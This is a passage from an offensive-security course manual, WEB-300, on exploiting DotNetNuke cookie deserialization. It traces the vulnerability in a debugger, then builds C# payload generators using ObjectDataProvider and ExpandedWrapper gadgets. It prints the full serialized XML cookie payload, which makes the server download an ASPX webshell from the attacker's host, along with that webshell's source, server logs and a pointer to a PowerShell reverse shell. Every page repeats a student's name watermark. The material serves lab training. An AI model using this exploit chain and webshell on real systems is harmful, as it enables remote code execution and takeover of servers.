Once we hit our initial break point, we can see the following, somewhat imposing call stack: 
 
Figure 148: LoadProfile callstack 
If we look backwards a couple of steps from the top of the call stack in Figure 148, we see that 
the getter for the UserMode property of the PortalSettings class is invoked. This getter function 
has a slightly complex implementation as can be seen in the figure below. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
210 
 
Figure 149: Implementation of the PortalSettings.UserMode getter. 
We can see that the call to the Personalization.GetProfile method, the next entry in the call stack, 
is located on line 925. We can set a breakpoint on line 926 and resend our proof of concept 
request in order to verify that we can reach this call. 
Notice that our breakpoint, which has been hit as part of the processing of our unauthenticated 
request, is located inside the if statement. However, one of the if statement conditions in this 
case is a check of the HttpContext.Current.Request.IsAuthenticated boolean variable, as can be 
seen on line 922. This is curious as we clearly are not using any authentication or session cookies 
in our request, yet our request is treated as authenticated. 
In order to find out why that is, we need to look back at Figure 148 and notice that closer to the 
bottom 
of 
the 
call 
stack, 
there 
is 
a 
call 
to 
a 
function 
named 
AdvancedUrlReWriter.Handle404OrException. After tracing the code execution a few times, we 
discovered the root cause of the issue. 
 
Figure 150: The 404 request handler contains a HttpContext.User check 
Although the implementation of this function is rather long and complex, we are concerned with 
an instance in which the HttpContext.User property is checked. As we can see in Figure 150, if the 
User property of the request is null, then it gets assigned the value of the current thread user. 
The consequences of this code execution path are shown in the following figure: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
211 
 
Figure 151: Our unauthenticated http request becomes authenticated 
The boolean variable IsAuthenticated now indicates that its value is “true” and that the request is 
authenticated under the “IIS APPPOOL” group. The reasoning for this logic appears to lie in the 
fact that the 404 handler is invoked before the HttpContext.User object is set. Since the continued 
processing of the given request depends on the User.IsAuthenticated property, the developers are 
ensuring that no null references will occur by setting the User object to the WindowsPrinicipal 
object of the currently running thread. Now that we have completed our analysis of the 
vulnerability itself and have a working environment properly set up, it is time to consider how we 
can exploit this situation and what payload options we have at our disposal. 
7.3 Payload Options 
As we are dealing with a deserialization vulnerability, our goal is to find an object that can execute 
code that we can use for our purposes and that we can properly deserialize. So, let’s look at some 
options. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
212 
7.3.1 FileSystemUtils PullFile Method 
According to the original advisory, the DotNetNuke.dll assembly contains a class called 
FileSystemUtils. Furthermore, this class implements a method called PullFile. If we use the dnSpy 
search function, we can easily locate this function and look at its implementation. 
 
Figure 152: Searching for the PullFile function 
 
Figure 153: PullFile function implementation 
As we can see in Figure 153, this function could be very useful to us from an attacker perspective, 
as it allows us to download an arbitrary file from a given URL to the target server. This means that 
if we can trigger this method using the DNNPersonalization cookie, we could theoretically upload 
an ASPX shell and gain code execution on our target server. 
But before we proceed, we need to remember the limitations of XmlSerializer. Although this class 
is within the DNN application domain and would therefore be known to the serializer at runtime, 
XmlSerializer can not serialize class methods. It can only serialize public properties and fields. 
Unfortunately, the FileSystemUtils class does not expose any public properties that we could set 
or get in order to trigger the invocation of the PullFile method. This means that a serialized 
instance of this object will not bring us any closer to our goal. Therefore, we need to take a 
different approach. 
7.3.2 ObjectDataProvider Class 
In their presentation, Muñoz and Mirosh also disclosed four .NET deserialization gadgets, or 
classes that can facilitate malicious activities during the user-controlled deserialization process. 
The ObjectDataProvider gadget is arguably the most versatile and was leveraged during their DNN 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
213 
exploit presentation. Let’s recount those steps and take a deeper look into this class in order to 
understand why it is so powerful. 
According to the official documentation,79 the ObjectDataProvider class is used when we want to 
wrap another object into an ObjectDataProvider instance and use it as a binding source. This begs 
the question: What is a binding source? Once again, if we refer to the official documentation,80 we 
find that a binding source is simply an object that provides the programmer with relevant data. 
This data is then usually bound from its source to a target object such as a User Interface object 
(TextBox, ComboBox, etc) to display the data itself.81 
How does ObjectDataProvider help us? If we read more about this class, we can see that it allows 
us to wrap an arbitrary object and use the MethodName property to call a method from a 
wrapped object, along with the MethodParameters property to pass any necessary parameters to 
the function specified in MethodName. The key here is that with the help of the 
ObjectDataProvider properties (not methods), we can trigger method calls in a completely 
different object. 
This point is worth reiterating once more: by setting the MethodName property of the 
ObjectDataProvider object instance, we are able to trigger the invocation of that method. The 
ObjectDataProvider class also does not violate any limitations imposed by XmlSerializer, which 
means that it is an excellent candidate for our payload. 
But how exactly does this work? Let’s analyze the entire code execution chain in this gadget so 
that we can gain a better understanding of the mechanics involved. 
The ObjectDataProvider is defined and implemented in the System.Windows.Data namespace, 
which is located in the PresentationFramework.dll .NET executable file. Our Windows operating 
systems will likely have more than one instance of this file depending on the number of .NET 
Framework versions installed. For the purposes of this exercise, the one we want to use is located 
in the C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF directory. 
Based on the information from the official documentation, we need to take a closer look at the 
MethodName property as this is what triggers the target method in the wrapped object to be 
called. Once we have decompiled the correct DLL, we can inspect the MethodName getter and 
setter implementations as shown below. 
 
79 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2 
80 (Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/how-to-specify-the-binding-source 
81 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/data-binding-overview 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
214 
 
Figure 154: ObjectDataProvider MethodName property getter and setter 
In Figure 154, we can see that when the MethodName property is set, the private _methodName 
variable is set and ultimately the base.Refresh function call takes place. We’ll trace that call. 
 
Figure 155: Tracing the Refresh function call 
Here (Figure 155) we notice another function call, namely to BeginQuery. If we try to follow this 
execution path by clicking on the function name in dnSpy we will see the following: 
 
Figure 156: BeginQuery implementation 
This seems to be a dead end, but we need to realize that the ObjectDataProvider class inherits 
from the DataSourceProvider class, which is where dnSpy took us. Therefore, we need to make 
sure we navigate to the BeginQuery function implementation within the ObjectDataProvider class 
that overrides the inherited function. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
215 
 
Figure 157: Overridden BeginQuery function implementation 
At the end of BeginQuery (Figure 157) we can see that there is another call, specifically to the 
QueryWorker method. As before, we will continue tracing this as well. 
 
Figure 158: QueryWorker function implementation 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
216 
7.3.2.1.1 
 
Finally, in Figure 158, we arrive at a function call to InvokeMethodOnInstance on line 300. This is 
exactly the point at which the target method in the wrapped object is invoked. 
Let’s see if we can verify this chain of calls in a simple example project. 
7.3.3 Example Use of the ObjectDataProvider Instance 
We will use the following Visual Studio project as the basis for our final serialized payload 
generator. We will try to reuse as much of the existing DNN code as possible so that we do not 
have to reinvent the wheel. For this reason, we need to make sure that the DotNetNuke.dll and the 
PresentationFramework.dll files are added as references to our project, using the same process 
we described earlier. 
 
Figure 159: Necessary references are added to our PoC Visual Studio project 
Before continuing, we also need to make sure that we have a webserver available from which we 
can download an arbitrary file using the DNN vulnerability. We will use our Kali virtual machine for 
that purpose. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
217 
 
Figure 160: Using a Kali instance as our webserver 
With that out of the way, let’s look at the following code: 
01: using System; 
02: using System.IO; 
03: using System.Xml.Serialization; 
04: using DotNetNuke.Common.Utilities; 
05: using System.Windows.Data; 
06:  
07: namespace ODPSerializer 
08: { 
09:     class Program 
10:     { 
11:         static void Main(string[] args) 
12:         { 
13:             ObjectDataProvider myODP = new ObjectDataProvider(); 
14:             myODP.ObjectInstance = new FileSystemUtils(); 
15:             myODP.MethodName = "PullFile"; 
16:             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt"); 
17:             
myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt"); 
18:             Console.WriteLine("Done!"); 
19:         } 
20:     } 
21: } 
Listing 221 - Basic application to demonstrate the ObjectDataProvider functionality 
In Listing 221 on lines 1-5, we first make sure we set all the appropriate “using” directives to 
define the required namespaces. Then starting on line 13, we: 
• 
Create a ObjectDataProvider instance 
• 
Instruct it to wrap a DNN FileSystemUtils object 
• 
Instruct it to call the PullFile method 
• 
Pass two arguments to the above mentioned method as required by its constructor 
The first argument points to our Kali webserver IP address and the second argument is the path 
to which the downloaded file should be saved to. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
218 
We will compile this application in Visual Studio and debug it using dnSpy. To do so, we will start 
dnSpy and select the Start Debugging option from the Debug menu. In the Debug Program dialog 
box, 
we 
choose 
our 
compiled 
executable 
which 
should 
be 
located 
in 
the 
C:\Users\Administrator\source\repos\ODPSerializer\ODPSerializer\bin\Debug\ directory. We then 
need to ensure that the Break at option is set to “Entry Point”. 
 
Figure 161: Debugging the PoC application 
Once we start the debugging session, we should arrive at the following point: 
 
Figure 162: Hitting the entry point breakpoint in dnSpy 
From here, in the Assembly Explorer (left pane) we will see a number of other assemblies that 
have been automatically loaded by our process. 
As we are trying to verify the ObjectDataProvider analysis we performed earlier, we navigate to the 
System.Windows.Data.ObjectDataProvider.QueryWorker function implementation inside the 
PresentationFramework assembly and set a breakpoint on the function call to the 
InvokeMethodOnInstance method we identified earlier. We will finally let the process execution 
continue until this breakpoint is hit. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
219 
 
Figure 163: Our breakpoint on the function call to InvokeMethodOnInstance is triggered 
If we now look at the Call Stack window in dnSpy, we will see that the code execution occurred 
exactly as expected. 
 
Figure 164: The ObjectDataProvider MethodName.set call stack confirms the call chain identified during the static 
analysis 
One thing to notice at this point is that if we let the execution of our process continue, we will 
once again hit this breakpoint. As a matter of fact, this breakpoint will be reached three times. 
This corresponds to the number of times we are manipulating values related to our 
ObjectDataProvider instance. First, we set the MethodName property, which triggers the code 
chain we just analyzed and thus our breakpoint. We then set the MethodParameters values twice 
which will also trigger the breakpoint albeit with a slightly different call stack. 
Finally we can see in our webserver logs that the URL we specified has been reached and that the 
file C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt on the DNN server has been successfully 
created. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
220 
 
Figure 165: Webserver log indicates successful code execution 
 
Figure 166: The PoC file has been created on the DNN server 
At this point, we have demonstrated that an instance of the ObjectDataProvider class can indeed 
trigger the FileSystemUtils.PullFile method by simply setting the appropriate properties. Therefore, 
the only thing left for us to do is attempt to serialize this object and verify that we can trigger the 
same chain of events during deserialization. If this works, we will then move on and attempt to 
use the same object in the DNNPersonalization cookie. 
7.3.3.1 Exercises 
1. 
Repeat the steps described in the previous section. Use single-step debugging to follow the 
code execution chain starting with the invocation of the MethodName property setter. 
2. 
Verify that the ObjectDataProvider triggers the method invocation three times in our 
example. Review the call stack each time in order to understand how they differ. 
7.3.4 Serialization of the ObjectDataProvider 
As we mentioned earlier in this module, our DNNpersonalization cookie payload has to be in the 
XML format. Since we have already demonstrated how to serialize an object using the 
XmlSerializer class, we can add that code to our example application from Listing 221. However, 
based on our earlier analysis we know that the DNNPersonalization cookie has to be in a specific 
format in order to reach the deserialization function call. Specifically, it has to contain the “profile” 
node along with the “item” tag, which contains a “type” attribute describing the enclosed object. 
Rather than trying to reconstruct this structure manually, we can re-use the DNN function that 
creates that cookie value in the first place. This function is called SerializeDictionary and is located 
in the DotNetNuke.Common.Utilities.XmlUtils namespace. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
221 
 
Figure 167: The implementation of the function that creates the DNNPersonalization cookie values 
With that in mind, we will adjust our application source code to look like the following: 
01: using System; 
02: using System.IO; 
03: using System.Xml.Serialization; 
04: using DotNetNuke.Common.Utilities; 
05: using System.Windows.Data; 
06: using System.Collections; 
07:  
08: namespace ODPSerializer 
09: { 
10:     class Program 
11:     { 
12:         static void Main(string[] args) 
13:         { 
14:             ObjectDataProvider myODP = new ObjectDataProvider(); 
15:             myODP.ObjectInstance = new FileSystemUtils(); 
16:             myODP.MethodName = "PullFile"; 
17:             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt"); 
18:             
myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt"); 
19:  
20:             Hashtable table = new Hashtable(); 
21:             table["myTableEntry"] = myODP; 
22:             String payload = "; DNNPersonalization=" + 
XmlUtils.SerializeDictionary(table, "profile"); 
23:             TextWriter writer = new 
StreamWriter("C:\\Users\\Public\\PullFileTest.txt"); 
24:             writer.Write(payload); 
25:             writer.Close(); 
26:  
27:             Console.WriteLine("Done!"); 
28:         } 
29:     } 
30: } 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
222 
Listing 222 - Serialization of the ObjectDataProvider instance 
Starting on line 20 in Listing 222, we create a HashTable instance and proceed by adding an entry 
called “myTableEntry” to which we assign our ObjectDataProvider instance. We then use the DNN 
function to serialize the entire object while providing the required “profile” node name. Finally, we 
prepend the cookie name to the resulting string and save the final cookie value to a file. 
If we compile the new proof of concept and run it under the dnSpy debugger we will be greeted 
with the following message: 
 
Figure 168: A serialization error occurs when we try to serialize our object 
If we drill down to the _innerException > _message value of the exception variable, we can see that 
the serializer did not expect the FileSystemUtils class instance (Figure 169). 
 
Figure 169: Details of the thrown exception 
The reason this is happening is due to the way the XmlSerializer is instantiated in the 
SerializeDictionary function. If we refer to Figure 167, the XmlSerializer instance is created using 
whatever object type is returned by the GetType method on the object that was passed into the 
SerializeDictionary function. Since we are passing an ObjectDataProvider instance, this is the type 
the XmlSerializer will expect. It will have no knowledge of the object type that is wrapped in the 
ObjectDataProvider instance, which in our case is a FileSystemUtils object. Therefore the 
serialization fails. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
223 
It is important to note that we could in theory fix this issue by instantiating the XmlSerializer using 
a different constructor prototype, namely one that informs the XmlSerializer about the wrapped 
object type. The instantiation would then look similar to this: 
XmlSerializer xmlSerializer = new XmlSerializer(myODP.GetType(), new Type[] 
{typeof(FileSystemUtils)}); 
Listing 223 - Modification to the XmlSerializer instantiation to inform it about the wrapped object type 
However, this would not help us because the XmlSerializer instance inside the vulnerable DNN 
function would process the serialized object with the default constructor, i.e. it would not account 
for the additional object type generating the same error shown in Figure 169. 
The bottom line for us is that we cannot successfully serialize our object using the DNN 
SerializeDictionary function. This means that we need to consider the use of a different object that 
can help us achieve our goal, namely invocation of the PullFile method. 
We’ll tackle that problem next. 
7.3.5 Enter The Dragon (ExpandedWrapper Class) 
As a solution to the problem we described in the previous section, Muñoz and Mirosh suggested 
that the ExpandedWrapper class could be used to finalize the construction of a malicious payload. 
While that sounded good in theory, we found ourselves lacking details about how exactly this 
solution worked. Our assumption was that looking up the official documentation would be 
sufficient. However, in order to fully grasp the mechanics of this approach, a bigger effort is 
needed. 
The official documentation82 for the ExpandedWrapper class states that: 
This class is used internally by the system to implement support for queries with 
eager loading of related entities. This API supports the product infrastructure and 
is not intended to be used directly from your code. 
This short explanation is not helpful to our understanding in any meaningful way. Furthermore, 
the explanation of the type parameters in the same document makes everything even more 
confusing at first. Although there seems to be a lack of publicly available explanations about the 
specific use-cases for this class, the .NET Framework is open source, which allows us to look at 
the actual implementation of this class and try to understand what exactly we are dealing with. 
While the source code83 itself is not particularly interesting, the summary information at the 
beginning of the class implementation provides us with a clue. 
Provides a base class implementing IExpandedResult over projections. 
We are specifically focused on the term “projections”. While the concept of projections may be 
familiar to some software developers, it is necessary for us to review this idea briefly so we can 
gain a better understanding of what the ExpandedWrapper class does. If we look at the official 
 
82 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-
2?view=netframework-4.7.2 
83 (Microsoft, 2020), 
https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
224 
documentation for the Projection Operations,84 we learn that a projection is a mechanism by 
which a particular object is transformed into a different form. 
Projections (and expansions) are typically found in the world of data providers and databases. 
Their primary purpose is to reduce the number of interactions between an application and a 
backend database relative to the number of queries that are executed. In other words, they 
facilitate data retrieval using JOIN queries, rather than multiple individual queries.85 
While the details of this process are outside the scope of this module, there is one aspect of it 
that is highly relevant to our problem. Specifically, in order to enable the encapsulation of the data 
retrieved using expansions and projections, data providers need to be able to create objects of 
arbitrary types. This is accomplished using the ExpandedWrapper class, which represents a 
generic object type. Most importantly for us, the constructors for this class allow us to specify the 
object types of the objects that are encapsulated in a given instance. This is exactly what we need 
to enable the XmlSerializer to serialize an object properly and solve the issue we encountered 
previously. 
In essence, we can use this class to wrap our source object (ObjectDataProvider) into a new 
object type and provide the properties we need (ObjectDataProvider.MethodName and 
ObjectDataProvider.MethodParameters). 
This 
set 
of 
information 
is 
assigned 
to 
the 
ExpandedWrapper instance properties, which will allow them to be serialized by the XmlSerializer. 
Again, this satisfies the XmlSerializer limitations as it cannot serialize class methods, but rather 
only public properties and fields. 
Let’s see how that looks in practice. 
01: using System; 
02: using System.IO; 
03: using DotNetNuke.Common.Utilities; 
04: using System.Collections; 
05: using System.Data.Services.Internal; 
06: using System.Windows.Data; 
07:  
08: namespace ExpWrapSerializer 
09: { 
10:     class Program 
11:     { 
12:         static void Main(string[] args) 
13:         { 
14:             Serialize(); 
15:         } 
16:  
17:         public static void Serialize() 
18:         { 
19:             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new 
ExpandedWrapper<FileSystemUtils, ObjectDataProvider>(); 
20:             myExpWrap.ProjectedProperty0 = new ObjectDataProvider(); 
21:             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils(); 
22:             myExpWrap.ProjectedProperty0.MethodName = "PullFile"; 
 
84 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations 
85 (OakLeaf Systems, 2010), http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
225 
23:             
myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.tx
t"); 
24:             
myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullF
ileTest.txt"); 
25:  
26:  
27:             Hashtable table = new Hashtable(); 
28:             table["myTableEntry"] = myExpWrap; 
29:             String payload = XmlUtils.SerializeDictionary(table, "profile"); 
30:             TextWriter writer = new 
StreamWriter("C:\\Users\\Public\\ExpWrap.txt"); 
31:             writer.Write(payload); 
32:             writer.Close(); 
33:  
34:             Console.WriteLine("Done!"); 
35:         } 
36:  
37:     } 
38: } 
Listing 224 - Serializing an ExpandedWrapper object 
In Listing 224 starting on line 19 we can see that instead of using the ObjectDataProvider directly, 
we 
are 
now 
instantiating 
an 
object 
of 
type 
ExpandedWrapper<FileSystemUtils, 
ObjectDataProvider>. Furthermore, we use the generic ProjectedProperty0 property to create an 
ObjectDataProvider instance. The remainder of code should look familiar. 
If we compile and execute this code, we will see that there are no exceptions generated during the 
execution and that our webserver indeed processed a corresponding HTTP request. 
The serialized object now looks like this: 
<profile><item key="myTableEntry" 
type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.Fil
eSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, 
PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, 
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], 
System.Data.Services, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance 
xsi:type="FileSystemUtils" 
/><MethodName>PullFile</MethodName><MethodParameters><anyType 
xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType 
xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></Method
Parameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider><
/item></profile> 
Listing 225 - Serialized ExpandedWrapper instance 
However, our ultimate goal is to make sure that our serialized object can be properly deserialized 
within the DNN web application. We can test this quickly in our example application by 
implementing that functionality. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
226 
01: using System; 
02: using System.IO; 
03: using DotNetNuke.Common.Utilities; 
04: using DotNetNuke.Common; 
05: using System.Collections; 
06: using System.Data.Services.Internal; 
07: using System.Windows.Data; 
08:  
09: namespace ExpWrapSerializer 
10: { 
11:     class Program 
12:     { 
13:         static void Main(string[] args) 
14:         { 
15:             //Serialize(); 
16:             Deserialize(); 
17:         } 
18:  
19:         public static void Deserialize() 
20:         { 
21:             string xmlSource = 
System.IO.File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt"); 
22:             Globals.DeserializeHashTableXml(xmlSource); 
23:         } 
24:  
25:         public static void Serialize() 
26:         { 
27:             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new 
ExpandedWrapper<FileSystemUtils, ObjectDataProvider>(); 
28:             myExpWrap.ProjectedProperty0 = new ObjectDataProvider(); 
29:             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils(); 
30:             myExpWrap.ProjectedProperty0.MethodName = "PullFile"; 
31:             
myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.tx
t"); 
32:             
myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullF
ileTest.txt"); 
33:  
34:  
35:             Hashtable table = new Hashtable(); 
36:             table["myTableEntry"] = myExpWrap; 
37:             String payload = XmlUtils.SerializeDictionary(table, "profile"); 
38:             TextWriter writer = new 
StreamWriter("C:\\Users\\Public\\ExpWrap.txt"); 
39:             writer.Write(payload); 
40:             writer.Close(); 
41:  
42:             Console.WriteLine("Done!"); 
43:         } 
44:  
45:     } 
46: } 
Listing 226 - Testing the DNN deserialization of our ExpandedWrapper object 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
227 
Notice that in Listing 226 on line 19, we have implemented a simple Deserialize function. This 
function reads the serialized ExpandedWrapper object we have previously created from a file and 
uses the native DNN function to start the deserialization process. You will recall that this is the 
same function that is called in the LoadProfile (Figure 135) function we identified as the entry 
point for our vulnerability analysis at the beginning of this module. 
If we run this compiled application under dnSpy and set a breakpoint on the InvokeMember 
function call inside ObjectDataProvider.InvokeMethodOnInstance, we can indeed validate that the 
deserialization is proceeding as we hoped for by looking at the call stack (Figure 170). 
 
Figure 170: Deserialization of the ExpandedWrapper object 
Moreover Figure 171 shows that the myODPTest.txt file is being downloaded again from our 
webserver, indicating the PullFile method has been successfully triggered during the 
deserialization process. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
228 
 
Figure 171: Webserver log indicates successful code execution during deserialization 
Now that we have constructed and validated a working payload, it is finally time to put everything 
together and test it against our DNN server. 
7.3.5.1 Exercise 
Repeat the steps described in the previous section and ensure that the generated payload is 
working as intended. 
7.4 Putting It All Together 
At this point we can set up the entire attack and try to gain a reverse shell using this vulnerability. 
In order to do that, we will use a ASPX command shell that can be found on our attacking Kali VM. 
We’ll copy that into our webserver root directory and make sure we set the correct permissions 
on it. 
kali@kali:~$ locate cmdasp.aspx 
/usr/share/webshells/aspx/cmdasp.aspx 
 
kali@kali:~$ cat /usr/share/webshells/aspx/cmdasp.aspx 
<%@ Page Language="C#" Debug="true" Trace="false" %> 
<%@ Import Namespace="System.Diagnostics" %> 
<%@ Import Namespace="System.IO" %> 
<script Language="c#" runat="server"> 
void Page_Load(object sender, EventArgs e) 
{ 
} 
string ExcuteCmd(string arg) 
{ 
ProcessStartInfo psi = new ProcessStartInfo(); 
psi.FileName = "cmd.exe"; 
psi.Arguments = "/c "+arg; 
psi.RedirectStandardOutput = true; 
psi.UseShellExecute = false; 
Process p = Process.Start(psi); 
StreamReader stmrdr = p.StandardOutput; 
string s = stmrdr.ReadToEnd(); 
stmrdr.Close(); 
return s; 
} 
void cmdExe_Click(object sender, System.EventArgs e) 
{ 
Response.Write("<pre>"); 
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text))); 
Response.Write("</pre>"); 
} 
</script> 
<HTML> 
<HEAD> 
<title>awen asp.net webshell</title> 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
229 
</HEAD> 
<body > 
<form id="cmd" method="post" runat="server"> 
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 
20px" runat="server" Width="250px"></asp:TextBox> 
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 
18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button> 
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 
22px" runat="server">Command:</asp:Label> 
</form> 
</body> 
</HTML> 
 
<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --> 
<!--    http://michaeldaw.org   04/2007    --> 
 
kali@kali:~$ sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/ 
 
kali@kali:~$ sudo chmod 644 /var/www/html/cmdasp.aspx 
Listing 227 - Setting up our attacking webserver 
We’ll use our application to serialize the ExpandedWrapper object again, making sure that we 
modify the URL and the file name we use in the MethodName parameters. As a result, we should 
see a serialized object similar to the following: 
<profile><item key="myTableEntry" 
type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.Fil
eSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, 
PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, 
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], 
System.Data.Services, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance 
xsi:type="FileSystemUtils" 
/><MethodName>PullFile</MethodName><MethodParameters><anyType 
xsi:type="xsd:string">http://192.168.119.120/cmdasp.aspx</anyType><anyType 
xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParam
eters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item
></profile> 
Listing 228 - A payload that will upload an ASPX command shell to the DNN server from our Kali VM 
Please keep in mind that the reason we can write to the DNN root directory is due to the 
permissions we had to give to the IIS account, per DNN installation instructions: 
the website user account must have Read, Write, and Change Control of the root 
website directory and subdirectories ( this allows the application to create 
files/folders and update its config files) 
We can now modify a HTTP request as we did earlier in this module and send it to our target. This 
time however we will use our serialized object as the DNNPersonalization cookie value. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
230 
 
Figure 172: Sending our final payload to the DNN webserver 
Everything should have worked as expected at this point and our malicious payload should have 
executed as expected. We can confirm that by looking at the webserver log file, which indicates 
that our ASPX shell has been downloaded. 
192.168.121.120 - - [07/Sep/2018:13:31:13 -0700] "GET /cmdasp.aspx HTTP/1.1" 200 1662 
"-" "-" 
Listing 229 - Our malicious ASPX shell has been downloaded by the DNN web application 
Finally, we can validate our attack success by browsing to our newly uploaded webshell. 
 
Figure 173: Our ASPX command shell can be accessed on the DNN webserver 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
231 
7.4.1.1.1 
 
At this point, we can execute any command of our choosing. In order to wrap up our attack we 
will execute a PowerShell reverse shell command86 and make sure we receive that shell on our 
Kali VM. 
